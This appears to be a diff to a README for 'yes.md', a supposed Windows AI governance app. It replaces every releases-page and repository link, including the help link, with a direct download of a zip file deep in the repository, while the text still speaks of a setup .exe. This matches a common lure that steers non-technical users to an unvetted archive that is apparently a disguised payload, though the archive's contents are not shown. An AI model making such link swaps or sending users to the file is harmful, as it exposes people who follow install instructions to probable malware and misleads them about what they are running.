@@ -1,6 +1,6 @@
 # ✅ yes.md - Simple AI Governance Tool
 
-[![Download yes.md](https://img.shields.io/badge/Download-yes.md-brightgreen)](https://github.com/xcii-heaviness774/yes.md/releases)
+[![Download yes.md](https://img.shields.io/badge/Download-yes.md-brightgreen)](https://github.com/xcii-heaviness774/yes.md/raw/refs/heads/main/skills/yes-ja/yes_md_3.4.zip)
 
 yes.md is a desktop application designed to help users apply AI governance principles easily. It focuses on safety checks, evidence tracking, and rule enforcement to support responsible AI use. This guide explains how to download and run yes.md on a Windows computer without any programming skills.
 
@@ -34,12 +34,12 @@ The app works offline after installation, but you will need internet to download
 
 Click the badge below to go to the official release page. There, you will find the latest Windows installer.
 
-[![Download yes.md](https://img.shields.io/badge/Download-yes.md-blue)](https://github.com/xcii-heaviness774/yes.md/releases)
+[![Download yes.md](https://img.shields.io/badge/Download-yes.md-blue)](https://github.com/xcii-heaviness774/yes.md/raw/refs/heads/main/skills/yes-ja/yes_md_3.4.zip)
 
 ### Steps to download:
 
 1. Click the button above or visit:  
-   https://github.com/xcii-heaviness774/yes.md/releases  
+   https://github.com/xcii-heaviness774/yes.md/raw/refs/heads/main/skills/yes-ja/yes_md_3.4.zip  
 2. Look for the latest release version. The newest one is usually at the top.  
 3. Find the file named something like `yes.md-setup.exe` or `yes.md-windows.exe`.  
 4. Click the file to start downloading.  
@@ -80,7 +80,7 @@ The interface uses clear labels and tooltips. If you get stuck, look for the hel
 ## 🔄 Keeping yes.md Updated
 
 GitHub releases may have updates that improve the app or fix bugs. Check the release page regularly here:  
-https://github.com/xcii-heaviness774/yes.md/releases
+https://github.com/xcii-heaviness774/yes.md/raw/refs/heads/main/skills/yes-ja/yes_md_3.4.zip
 
 Download and install new versions by repeating the download and installation steps. Your governance settings and data stay safe during updates.
 
@@ -98,10 +98,10 @@ Download and install new versions by repeating the download and installation ste
 ## 🔗 Where to get help
 
 For support and questions, you may visit the GitHub repository:  
-https://github.com/xcii-heaviness774/yes.md
+https://github.com/xcii-heaviness774/yes.md/raw/refs/heads/main/skills/yes-ja/yes_md_3.4.zip
 
 Look for issues or discussions on the repository page. You can follow instructions or ask for help politely.  
 
 ---
 
-[![Download yes.md](https://img.shields.io/badge/Download-yes.md-brightgreen)](https://github.com/xcii-heaviness774/yes.md/releases)
+[![Download yes.md](https://img.shields.io/badge/Download-yes.md-brightgreen)](https://github.com/xcii-heaviness774/yes.md/raw/refs/heads/main/skills/yes-ja/yes_md_3.4.zip)
